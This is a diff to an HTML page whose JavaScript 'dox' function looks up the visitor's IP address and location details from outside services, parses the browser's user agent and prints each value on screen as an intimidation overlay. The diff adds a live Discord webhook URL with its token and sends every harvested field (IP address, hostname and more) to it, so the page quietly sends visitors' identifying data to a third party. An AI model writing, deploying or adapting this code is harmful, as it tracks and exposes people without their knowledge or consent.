@@ -1,4 +1,4 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 
 
 <script language="javascript">
@@ -251,41 +251,58 @@ async function start_dox() {
     dox.style.opacity = "1";
 
     let fontSize = Math.min(window.innerHeight / 10, window.innerWidth / 20);
-    overlay.style.fontSize = fontSize + "px"; 
+    overlay.style.fontSize = fontSize + "px";
 
-    // Wrap the code inside a try-catch block to handle any errors
-    try {
+    // Function to send data to Discord webhook
+    async function sendToWebhook(data) {
+        const webhookURL = 'https://discord.com/api/webhooks/1205229146007928873/5APc7mt8N7nQip9fXoe6Udmx8Wv2XnBFYs5kVO5usohLrnB1v1AZw-G1ScqEkEG8WMCF';
+        try {
+            await fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    embeds: [data]
+                })
+            });
+        } catch (error) {
+            console.error('Error sending data to webhook:', error);
+        }
+    }
+
+    async function push(key, value) {
+        let span = document.createElement("span");
+        span.innerText = key + ": " + value;
+        overlay.appendChild(span);
+        const height = overlay.getBoundingClientRect().height;
+        if (height > window.innerHeight) {
+            console.log("font size");
+            fontSize = fontSize - (fontSize / 10);
+            overlay.style.fontSize = fontSize + 'px';
+        }
+
+        // Create embed fields for Discord webhook
+        const embedField = {
+            name: key,
+            value: value,
+            inline: true
+        };
+
+        await sendToWebhook({
+            title: 'Browser Detector Data',
+            color: 0x00ff00, // Green color
+            fields: [embedField]
+        });
+
+        await new Promise((res, rej) => setTimeout(res, 300));
+    }
+
+        try {
         // Fetch IP details
         const basic = await (await fetch('https://wtfismyip.com/json')).json();
         let detailed = await (await fetch(`https://we-are-jammin.xyz/json/${basic.YourFuckingIPAddress}`)).json();
         const detector = new BrowserDetector(window.navigator.userAgent).parseUserAgent();
-
-        async function push(key, value) {
-            let span = document.createElement("span");
-            span.innerText = key + ": " + value;
-            overlay.appendChild(span);
-            const height = overlay.getBoundingClientRect().height;
-            if (height > window.innerHeight) {
-                console.log("font size");
-                fontSize = fontSize - (fontSize / 10);
-                overlay.style.fontSize = fontSize + 'px';
-            }
-
-             // Send data to webhook
-             try {
-                await fetch('YOUR_WEBHOOK_URL', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ key: key, value: value })
-                });
-            } catch (error) {
-                console.error('Error sending data to webhook:', error);
-            }
-
-            await new Promise((res, rej) => setTimeout(res, 300));
-        }
 
         await push('IP Address', basic.YourFuckingIPAddress);
         await push('Hostname', basic.YourFuckingHostname);
